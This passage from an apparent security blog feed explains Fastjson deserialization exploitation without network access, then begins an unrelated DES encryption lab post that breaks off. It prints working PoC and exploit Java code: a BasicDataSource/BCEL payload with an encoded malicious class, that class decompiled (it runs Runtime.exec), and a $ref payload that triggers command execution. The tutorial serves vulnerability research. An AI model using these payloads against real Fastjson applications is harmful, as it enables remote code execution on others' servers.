class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dataSource != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> dataSource;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>均为 false 才能调用</p><p>接着</p><p>在 <code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection()</code>  调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Connection <span class="title function_">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (Utils.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">            <span class="keyword">final</span> PrivilegedExceptionAction&lt;Connection&gt; action = <span class="keyword">new</span> <span class="title class_">PaGetConnection</span>();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> AccessController.doPrivileged(action);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> PrivilegedActionException e) &#123;</span><br><span class="line">                <span class="keyword">final</span> <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> e.getCause();</span><br><span class="line">                <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> SQLException) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (SQLException) cause;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> createDataSource().getConnection();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>至此，链子的整体流程</p><p><img src="https://img-blog.csdnimg.cn/1693c5418e4c430388cea181a4df746a.png" alt="在这里插入图片描述"></p><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kilo、冰室/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/7</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 14:30</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload2</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;ki10\&quot;:&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;: \&quot;Moc\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是</p><p>这里 poc 的嵌套</p><p>最后 <code>JSON.parse</code>  触发 <code>key.toString()</code></p><p><img src="https://img-blog.csdnimg.cn/fb74d9af426b42988769e263895e46bb.png" alt="在这里插入图片描述"></p><p>整个 poc 都为 <code>JSONObject</code>  ， <code>value</code>  为 <code>Moc</code></p><p>然后判断是否是 <code>JSON</code>  对象，再去识别 <code>key</code>  和 <code>value</code></p><p><img src="https://img-blog.csdnimg.cn/195ff4481c6742f3a50e37cba995bd88.png" alt="在这里插入图片描述"></p><p>调试过程中确实两次落在该断点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key = (key == <span class="literal">null</span>) ? <span class="string">&quot;null&quot;</span> : key.toString();</span><br></pre></td></tr></table></figure><p>而在执行 toString () 时会将当前类转为字符串形式，会提取类中所有的 Field，执行相应的 getter 、is 等方法。因此也会执行 getConnection 方法</p><p>当然以上都是建立在 <code>parse()</code>  方法之上</p><p>如果 poc 是 <code>parseObject()</code>  ，那就简单了，因为在处理过程中会调用所有的 setter 和 getter 方法。详细可以看 FastJson 反序列化基础</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kilo、冰室/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/7</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 14:30</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsonBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;               \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/aa37b1f2217b4c569f4cc52e1c21fa59.png" alt="在这里插入图片描述"></p><p>上面我们说了那么多，基本已经走完了流程，但还有个问题，这里的 <code>driverClassName</code>  后面的值是什么</p><p>可能还要到 <code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>  去找答案</p><p>这里我们说，我们是通过 <code>loadClass</code>  下重写的方法来执行的，其中有个 <code>defiClass</code>  显然是通过字节码来实现的。再回过头看 <code>createClass</code>  中的 <code>Utility.*decode*</code></p><p>这里我们还原一下内容</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCELDecode</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">encode</span> <span class="operator">=</span> <span class="string">&quot;$l$8b$I$A$A$A$A$A$A$A...&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] decode = Utility.decode(encode,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;DecodeClass.class&quot;</span>);</span><br><span class="line">        fileOutputStream.write(decode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到 <code>DecodeClass.class</code></p><p>实际上就是静态方法里面执行弹计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by Fernflower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.p1ay2win.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Evil</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var1) &#123;</span><br><span class="line">            var1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x04-ref"><a class="markdownIt-Anchor" href="#0x04-ref">#</a> 0x04 $ref</h2><p>fastjson≥1.2.36</p><p>这里我们要讨论的问题就是上面 <code>JSON.parse()</code>  和 <code>JSON.parseObect()</code>  这两种不同方法调用的问题</p><p>这里给出另一种解决方法</p><p>JSONPath</p><p><img src="https://img-blog.csdnimg.cn/de2930ecd2f74ab1830e069a9f498672.png" alt="在这里插入图片描述"></p><p>添加依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">1.2</span><span class="number">.36</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kilo、冰室/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 0:10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCalc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;org.example.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span> kilo、冰室/ki10Moc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2022/11/14</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@time</span> 0:06</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span> http://ki10.top</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/dc6850c866f6481dace57ebac550a4fb.png" alt="在这里插入图片描述"></p><p>首先就是我们要弄清该 <code>payload</code>  ，就需要知道 <code>[&#123;\&quot;@type\&quot;:\&quot;org.example.Test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]</code>  ref 的作用</p><p><img src="https://img-blog.csdnimg.cn/ab171b9139874091a82122c3fad6eb83.png" alt="在这里插入图片描述"></p><p>打上断点来 debug 下</p><p>首先是 <code>handleResovleTask</code></p><p>这里是处理 <code>refvalue</code>  的地方</p><p>首先判断是否是<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>开头，然后获取对象，最后确定</mtext><mi>r</mi><mi>e</mi><mi>f</mi><mtext>：</mtext><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">开头，然后获取对象，最后确定ref：`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">头</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">获</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">象</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">最</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">确</span><span class="mord cjk_fallback">定</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord cjk_fallback">：</span><span class="mord">‘</span></span></span></span>[0].cmd`</p><p><code>$[0]</code>  表示的是数组里的第一个元素，则 <code>$[0].cmd</code>  表示的是获取第一个元素的 cmd 属性的值。</p><p><img src="https://img-blog.csdnimg.cn/fdb0c42566414e3591b78f1d191acdc8.png" alt="在这里插入图片描述"></p><p>来看 <code>getObject()</code></p><p><img src="https://img-blog.csdnimg.cn/751616c24c5f457da87a714592975f71.png" alt="在这里插入图片描述"></p><p>获取数组，第 0 个位 <code>$</code>  ，第 1 个为 <code>$[0]</code>  并返回该对象</p><p>下面是 <code>JSONPath.eval()</code></p><p><img src="https://img-blog.csdnimg.cn/26884761543445938984c316e180dd68.png" alt="在这里插入图片描述"></p><p>继续跟进 <code>compile()</code></p><p><img src="https://img-blog.csdnimg.cn/898491946cbf4d85a6c4be251c380780.png" alt="在这里插入图片描述"></p><p>这里路径不为空，不会抛出异常</p><p><img src="https://img-blog.csdnimg.cn/e8dbe9b8ad8c4c1799c94e66cb9057d9.png" alt="在这里插入图片描述"></p><p>接着跟进 <code>eval</code>  下的 <code>init()</code></p><p><img src="https://img-blog.csdnimg.cn/664019ba77384d2b825bd7318ec416fa.png" alt="在这里插入图片描述"></p><p>这里 segments 为空，继续往下走</p><p><img src="https://img-blog.csdnimg.cn/18ab23cb8a31429ab519f60a356a591e.png" alt="在这里插入图片描述"></p><p>在调用 <code>parser.explain()</code>  方法前 <code>segments</code>  为空</p><p><img src="https://img-blog.csdnimg.cn/28d9f9f3afbf4d2a96dfc9db42d162dd.png" alt="在这里插入图片描述"></p><p><code>Segement[]</code>  初始长度为 8，因为其接口一共有 8 个</p><p><img src="https://img-blog.csdnimg.cn/e60e37f4682847d78af2d7a9ad4ac0c5.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/36139b0c68da4c61a6d3d5901ed056b8.png" alt="在这里插入图片描述"></p><p>这里 <code>segment</code>  值就变成了 <code>JSONPath</code></p><p><img src="https://img-blog.csdnimg.cn/78b0c4eb78764b249e060612f04373dc.png" alt="在这里插入图片描述"></p><p>循环追加到 <code>StringBuilder</code>  后面</p><p><img src="https://img-blog.csdnimg.cn/7f08963a6fb2456db9098255b6b28de4.png" alt="在这里插入图片描述"></p><p>然后按顺序执行前面 <code>explain</code>  () 生成的 <code>Segment array</code></p><p>最终在 <code>getPropertyValue()</code>  反射调用 <code>get()</code></p><p>至此，就完成了不使用 <code>JSON.parseObect()</code>  也能调用 <code>get()</code>  的方法</p><p>最后可以看下 Y4 师傅的</p><p><a href="https://blog.csdn.net/solitudi/article/details/120275526?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166824314316782425171350%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166824314316782425171350&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-120275526-null-null.nonecase&amp;utm_term=ref&amp;spm=1018.2226.3001.4450">[Java 安全] Fastjson＞=1.2.36$ref 引用可触发 get 方法分析_Y4tacker 的博客 - CSDN 博客_fastjson get 方法</a></p><h2 id="0x05-参考"><a class="markdownIt-Anchor" href="#0x05-参考">#</a> 0x05 参考</h2><p><a href="https://blog.csdn.net/solitudi/article/details/120275526?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166824314316782425171350%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=166824314316782425171350&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-120275526-null-null.nonecase&amp;utm_term=ref&amp;spm=1018.2226.3001.4450">[Java 安全] Fastjson＞=1.2.36$ref 引用可触发 get 方法分析_Y4tacker 的博客 - CSDN 博客_fastjson get 方法</a></p><p><a href="https://www.cnblogs.com/R0ser1/p/15918626.html#%E4%BB%80%E4%B9%88%E6%98%AFref">fastjson 不出网学习 - R0ser1 - 博客园 (cnblogs.com)</a></p><p><a href="https://ccship.cn/2021/12/21/fastjson%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b9%8bbasicdatasource%e5%88%a9%e7%94%a8%e9%93%be/">FastJson 反序列化之 BasicDataSource 利用链 – cc (ccship.cn)</a></p><p><a href="https://blog.play2win.top/2021/11/25/fastjson%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8%E7%AE%80%E6%9E%90/">fastjson 不出网利用简析 - P1ay2win’s blog (play2win.top)</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;本文首发于奇安信攻防社区奇安信攻防社区-浅析fastjson不出网利用方式-butiannet&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#本文首发于奇安信攻防社区奇安信攻防社区-浅析fastjson不出网利用方式-butiannet</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java安全" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="FastJson" scheme="https://ki10moc.github.io/tags/FastJson/"/>
    
  </entry>
  
  <entry>
    <title>信安实验-DES(备课)</title>
    <link href="https://ki10moc.github.io/2022/09/26/%E4%BF%A1%E5%AE%89%E5%AE%9E%E9%AA%8C-DES(%E5%A4%87%E8%AF%BE)/"/>
    <id>https://ki10moc.github.io/2022/09/26/%E4%BF%A1%E5%AE%89%E5%AE%9E%E9%AA%8C-DES(%E5%A4%87%E8%AF%BE)/</id>
    <published>2022-09-26T14:02:17.000Z</published>
    <updated>2022-09-26T14:03:53.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="des加密"><a class="markdownIt-Anchor" href="#des加密">#</a> DES 加密</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">明文M=(<span class="number">0123456789</span>ABCDEF)<span class="number">16</span>=(<span class="number">00000001</span> <span class="number">00100011</span> <span class="number">01000101</span> <span class="number">01100111</span> <span class="number">10001001</span> <span class="number">10101011</span> <span class="number">11001101</span> <span class="number">11101111</span>)<span class="number">2</span></span><br><span class="line">密钥K=（<span class="number">133457799</span>BBCDFF1）<span class="number">16</span>=(<span class="number">00010011</span> <span class="number">00110100</span> <span class="number">01010111</span> <span class="number">01111001</span> <span class="number">10011011</span> <span class="number">10111100</span> <span class="number">11011111</span> <span class="number">11110001</span>)<span class="number">2</span></span><br></pre></td></tr></table></figure><h3 id="秘钥的计算"><a class="markdownIt-Anchor" href="#秘钥的计算">#</a> 秘钥的计算</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">K=<span class="number">00010011</span> <span class="number">00110100</span> <span class="number">01010111</span> <span class="number">01111001</span> <span class="number">10011011</span> <span class="number">10111100</span> <span class="number">11011111</span> <span 